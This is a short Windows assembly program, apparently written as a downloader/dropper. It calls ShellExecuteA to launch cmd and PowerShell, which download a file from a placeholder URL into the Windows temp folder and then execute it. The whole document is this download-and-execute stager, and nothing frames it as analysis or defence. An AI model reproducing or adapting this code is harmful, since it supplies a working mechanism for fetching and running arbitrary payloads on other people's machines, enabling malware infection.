extern _ShellExecuteA
global _main

section .data
    type db "open",0
    cmd db "cmd",0
    par db "/c powershell -Command wget 'URL' -OutFile c:\windows\temp\file.exe; c:\windows\temp\file.exe",0

section .text
_main:
    push 0
    push 0
    push par
    push cmd
    push type
    push 0
    call _ShellExecuteA